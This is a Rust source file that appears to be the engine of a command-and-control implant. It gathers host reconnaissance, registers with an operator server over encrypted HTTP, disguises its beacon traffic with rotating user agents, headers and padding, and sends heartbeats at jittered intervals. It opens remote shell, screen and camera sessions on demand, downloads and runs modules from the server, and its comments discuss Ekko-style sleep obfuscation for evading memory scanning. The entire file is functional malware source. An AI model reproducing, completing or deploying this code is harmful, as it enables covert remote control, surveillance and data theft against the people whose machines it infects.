use serde_json::Value;

use libra_common::protocol::WebSocketMessage;
use libra_crypto::AgentCrypto;
use libra_comm::http::HttpCommunicator;
use libra_comm::ws::{WsCommunicator, WsSender, send_msg_via};

use crate::config::ConfigManager;
use crate::engine::heartbeat::{heartbeat_tick, jittered_interval};
use crate::engine::shell::ShellSession;

mod dispatcher;
mod heartbeat;
mod shell;
mod streams;
mod utils;

pub struct AgentEngine {
    config: ConfigManager,
    crypto: AgentCrypto,
    http: Option<HttpCommunicator>,
    ws: Option<WsCommunicator>,
    ws_tx: Option<WsSender>,
    agent_id: String,
    /// Per-session channel token issued at registration (rotates per session).
    session_token: String,
    /// 流量伪装 profile（单入口/壳字段/UA/padding），注册响应下发。
    profile: Option<libra_common::models::ProfileTransform>,
    /// Profile paths adopted at registration (empty = use build-time paths).
    heartbeat_path: String,
    result_path: String,
}

/// Shared, thread-safe state that concurrent WS message handlers need.
/// One instance lives for the whole agent run; every inbound message is
/// dispatched as its own task against it, so a long-running task (module
/// execution, network collection, …) never blocks the receive loop.
pub(crate) struct EngineShared {
    pub agent_id: String,
    pub shell_session: tokio::sync::Mutex<Option<ShellSession>>,
    pub screen_session: std::sync::Mutex<Option<tokio::sync::watch::Sender<bool>>>,
    pub camera_session: std::sync::Mutex<Option<std::sync::Arc<std::sync::atomic::AtomicBool>>>,
    /// 串行化「消息处理」与「混淆 sleep」：Ekko 会加密整个镜像，混淆 sleep
    /// 期间任何执行模块代码的任务都必须等待，否则会踩到密文崩溃。
    pub process_gate: tokio::sync::Mutex<()>,
}

impl AgentEngine {
    pub fn new(config: ConfigManager) -> Self {
        Self {
            config,
            crypto: AgentCrypto::new(),
            http: None,
            ws: None,
            ws_tx: None,
            agent_id: String::new(),
            session_token: String::new(),
            profile: None,
            heartbeat_path: String::new(),
            result_path: String::new(),
        }
    }

    pub fn agent_id(&self) -> &str { &self.agent_id }

    // ── Main entry point ─────────────────────────────────────────────

    pub async fn run(&mut self) -> Result<(), String> {
        loop {
            match self.run_once().await {
                // 会话丢失（服务端重启/重启后 token 失效）：重置通道状态，
                // 重新走注册流程（新 token + 可能的新会话密钥）。crypto 的
                // RSA keypair 与已有 session key 保留——服务端若仍持有旧
                // session key 则复用（hasSessionKey=true），否则重新下发。
                Err(e) if e == "SESSION_LOST" => {
                    libra_common::dlog!("[INFO] session lost — re-registering");
                    self.http = None;
                    self.ws = None;
                    self.ws_tx = None;
                    self.session_token.clear();
                    self.profile = None;
                    continue;
                }
                other => return other,
            }
        }
    }

    async fn run_once(&mut self) -> Result<(), String> {
        self.crypto.generate_key_pair();

        let hw = libra_platform::hardware::collect();
        let hw_json = libra_platform::hardware::serialize(&hw);

        libra_modules::recon::NetworkInfo::warmup_geo().await;

        let mut http = HttpCommunicator::new(
            &self.config.server_url,
            &self.config.register_path,
            &self.config.heartbeat_path,
            &self.config.result_path,
        );

        // 构建时注入的流量伪装（UA/附加头/路径后缀）在注册前生效
        // （注册请求本身也带伪装）；注册后服务端 profile 覆盖。
        http.set_build_style(
            self.config.user_agents.clone(),
            self.config.extra_headers.clone(),
            self.config.path_suffixes.clone(),
        );
        // 服务端 RSA 公钥：注册混合加密
        if !self.config.server_public_key.is_empty() {
            http.set_server_public_key(self.config.server_public_key.clone());
        }

        let sys_json = libra_modules::recon::SystemInfo::collect();
        let sys: Value = serde_json::from_str(&sys_json).unwrap_or(Value::Null);
        let hostname = sys["hostname"].as_str().unwrap_or("unknown");
        let user_name = sys["userName"].as_str().unwrap_or("unknown");
        let os_version = sys["osVersion"].as_str().unwrap_or("unknown");
        let arch = sys["arch"].as_str().unwrap_or("unknown");

        let outcome = http.register(
            hostname, user_name, os_version, arch,
            self.crypto.rsa_public_key().unwrap_or(""),
            &self.config.beacon_secret,
            &hw_json,
            self.crypto.session_key().is_some(),
        ).await?;

        let agent_id = outcome.agent_id;
        let session_key = outcome.session_key;
        self.session_token = outcome.session_token.clone().unwrap_or_default();

        // 采用单入口流量伪装 profile（路径/壳字段/UA/padding）
        if let Some(p) = outcome.profile {
            self.profile = Some(p.clone());
            http.set_profile(p);
        }
        // 心跳节奏覆盖（服务端 profile 下发值优先于构建时值）
        if outcome.heartbeat_interval_ms > 0 {
            self.config.heartbeat_interval_ms = outcome.heartbeat_interval_ms;
        }
        if outcome.jitter_percent > 0.0 {
            self.config.jitter_percent = outcome.jitter_percent;
        }

        // Establish AES-256-GCM session key from the RSA-encrypted blob.
        if let Some(key) = session_key {
            if let Err(e) = self.crypto.set_session_key(&key) {
                libra_common::dlog!("[WARN] Failed to set session key: {}", e);
            } else {
                libra_common::dlog!("[INFO] AES-256-GCM session key established");
            }
        } else {
            libra_common::dlog!("[WARN] Server did not return a session key (encryption disabled)");
        }

        libra_common::dlog!("[INFO] registered | agent_id={} | hostname={}", agent_id, hostname);
        self.agent_id = agent_id;
        self.http = Some(http);

        // WS 按需：构造通信器但**不自动连接**。只有服务端心跳响应带
        // wsNeeded=true（操作员打开 shell/屏幕/摄像头）时才建立连接。
        let mut ws = WsCommunicator::new(&self.config.ws_url(), &self.agent_id);
        if let Some(key) = self.crypto.session_key() {
            ws.set_session_key(key);
        }
        self.ws = Some(ws);

        self.main_loop().await
    }

    // ── Main event loop（WS 按需）───────────────────────────────────

    async fn main_loop(&mut self) -> Result<(), String> {
        let mut ws = self.ws.take().ok_or("WS not initialized")?;
        // WsSender 的 write 端为 Arc 共享：连接建立后自动生效，未连接时静默丢弃。
        let tx = ws.sender();
        let _http = self.http.as_ref().ok_or("HTTP not initialized")?;
        let agent_id = self.agent_id.clone();
        let server_url = self.config.server_url.clone();
        // 单入口模式：所有 beacon 流量走同一入口路径（注册前为 register_path，
        // 注册后 HttpCommunicator 已切换为 profile.entry_path）。
        let register_path = self.config.register_path.clone();

        let (shell_tx, mut shell_rx) = tokio::sync::mpsc::unbounded_channel::<WebSocketMessage>();
        let hb_key = self.crypto.session_key();
        let hb_interval_ms = self.config.heartbeat_interval_ms;
        let hb_jitter = self.config.jitter_percent;
        let session_token = self.session_token.clone();
        let profile = self.profile.clone();

        // Cloud module manager — downloads modules on demand (shared with the
        // heartbeat task that executes one-shot tasks). 单入口：路径参数用
        // register_path（communicator 已切换到 profile.entry_path）。
        let module_manager = std::sync::Arc::new(tokio::sync::Mutex::new(
            crate::module_manager::ModuleManager::new(
                &server_url, &register_path, &register_path, &register_path,
                agent_id.clone(), hb_key, Some(session_token.clone()),
            ),
        ));

        // Shared state for concurrent handlers.
        let shared = std::sync::Arc::new(EngineShared {
            agent_id: agent_id.clone(),
            shell_session: tokio::sync::Mutex::new(None),
            screen_session: std::sync::Mutex::new(None),
            camera_session: std::sync::Mutex::new(None),
            process_gate: tokio::sync::Mutex::new(()),
        });

        // WS 按需命令通道：true = 服务端要求建立 WS；false = 释放。
        let (ws_cmd_tx, mut ws_cmd_rx) = tokio::sync::mpsc::unbounded_channel::<bool>();

        // Spawn heartbeat task using its own HTTP client, AES-GCM encrypted
        // with the session key, with per-tick jitter. Signals a re-register if
        // the session is lost (e.g. the server restarted).
        let (reconnect_tx, mut reconnect_rx) = tokio::sync::mpsc::unbounded_channel::<()>();
        let hb_mm = module_manager.clone();
        let hb_reconnect = reconnect_tx.clone();
        let hb_ws_cmd = ws_cmd_tx.clone();
        tokio::spawn(async move {
            let mut hb_http = HttpCommunicator::new(&server_url, &register_path, &register_path, &register_path);
            if !session_token.is_empty() {
                hb_http.set_session_token(session_token);
            }
            if let Some(p) = profile {
                hb_http.set_profile(p);
            }
            loop {
                match heartbeat_tick(&hb_http, &agent_id, hb_key.as_ref(), &hb_mm).await {
                    Ok(ws_needed) => {
                        // 每个心跳都同步一次 WS 需求（幂等，服务端状态为准）
                        let _ = hb_ws_cmd.send(ws_needed);
                    }
                    Err(e) if e == "SESSION_LOST" => {
                        libra_common::dlog!("[WARN] session lost — triggering re-registration");
                        let _ = hb_reconnect.send(());
                        break;
                    }
                    _ => {}
                }

                // beacon sleep：块状抖动。
                //
                // ⚠️ Ekko 混淆 sleep（libra_syscalls::obfuscated_sleep）已被移出主路径：
                // 它加密整个镜像期间，tokio 多线程 runtime 的 IO 驱动/调度器/其他
                // worker 线程仍在执行 agent 的 .text（已被加密）→ 执行垃圾指令 →
                // 栈损坏/stack overflow 崩溃（WS 连接建立后 IO 活跃，必现）。
                // process_gate 只能挡住业务任务，挡不住 tokio 内部线程。
                // 要安全启用需：单线程进程 + 加密前挂起所有其他线程（隔离 VM 验证）。
                let interval_ms = jittered_interval(hb_interval_ms, hb_jitter);
                tokio::time::sleep(std::time::Duration::from_millis(interval_ms)).await;
            }
        });

        // ── WS 按需状态机 ──
        // 未连接：等待 wsNeeded=true（或重注册信号），收到后建立连接。
        // 已连接：处理 WS 消息 / shell 输出转发 / wsNeeded=false 断开 / 断线自愈
        // （断线后回到未连接态，下个心跳若仍需要则自动重连）。
        let mut ws_connected = false;
        let mut do_reconnect = false;

        loop {
            if do_reconnect {
                break;
            }

            if !ws_connected {
                tokio::select! {
                    _ = reconnect_rx.recv() => {
                        libra_common::dlog!("[INFO] re-registering with server");
                        do_reconnect = true;
                    }
                    Some(need) = ws_cmd_rx.recv() => {
                        if need {
                            for i in 0..3 {
                                if ws.connect().await.is_ok() {
                                    ws_connected = true;
                                    self.ws_tx = Some(tx.clone());
                                    break;
                                }
                                if i < 2 {
                                    tokio::time::sleep(std::time::Duration::from_secs(2)).await;
                                }
                            }
                            // 失败：保持未连接，下个心跳会再次同步需求
                        }
                    }
                }
                continue;
            }

            // WS 已连接：空闲时短暂让出处理锁，让心跳任务有机会进入 Ekko 混淆 sleep。
            match shared.process_gate.try_lock() {
                Ok(_gate) => {
                    tokio::select! {
                        _ = reconnect_rx.recv() => {
                            libra_common::dlog!("[INFO] re-registering with server");
                            do_reconnect = true;
                        }

                        Some(need) = ws_cmd_rx.recv() => {
                            if !need {
                                libra_common::dlog!("[INFO] ws release — closing channel");
                                ws.close().await;
                                ws_connected = false;
                            }
                        }

                        Some(msg) = shell_rx.recv() => {
                            libra_common::dlog!("[SEND] {} | rid={} | data={}",
                                msg.msg_type,
                                msg.request_id.as_deref().unwrap_or("-"),
                                msg.data.as_ref().map(|v| v.to_string()).unwrap_or_else(|| "null".into())
                            );
                            send_msg_via(&tx, &msg).await;
                        }

                        result = tokio::time::timeout(std::time::Duration::from_millis(50), ws.receive()) => {
                            match result {
                                Ok(Some(msg)) => {
                                    libra_common::dlog!("[RECV] {} | rid={} | data={}",
                                        msg.msg_type,
                                        msg.request_id.as_deref().unwrap_or("-"),
                                        msg.data.as_ref().map(|v| v.to_string()).unwrap_or_else(|| "null".into())
                                    );
                                    // Dispatch each inbound message as its own task so a
                                    // long-running handler (module execution, network
                                    // collection, …) does not block receiving or handling
                                    // further messages.
                                    let s = shared.clone();
                                    let msg_tx = tx.clone();
                                    let msg_shell_tx = shell_tx.clone();
                                    let mm = module_manager.clone();
                                    tokio::spawn(async move {
                                        // 等混淆 sleep 结束再执行模块代码
                                        let _g = s.process_gate.lock().await;
                                        crate::engine::dispatcher::dispatch(
                                            &s, &msg_tx, &msg_shell_tx, &mm, msg,
                                        ).await;
                                    });
                                }
                                Ok(None) => {
                                    // 断线：回到未连接态，下个心跳若仍需 WS 则自动重连
                                    libra_common::dlog!("[WARN] WebSocket disconnected");
                                    ws.close().await;
                                    ws_connected = false;
                                }
                                Err(_) => {
                                    // 50ms 内无消息：释放锁，给心跳混淆 sleep 机会
                                }
                            }
                        }
                    }
                }
                Err(_) => {
                    // 心跳在混淆 sleep，短暂让出后重试
                    tokio::time::sleep(std::time::Duration::from_millis(20)).await;
                }
            }
        }

        // Put ws back before returning
        self.ws = Some(ws);
        // 此处只可能是重注册信号（SESSION_LOST）触发的 break：
        // heartbeat 检测到会话丢失 → reconnect_rx → do_reconnect。
        // 返回 SESSION_LOST 让 run() 重新走注册流程。
        Err("SESSION_LOST".into())
    }
}
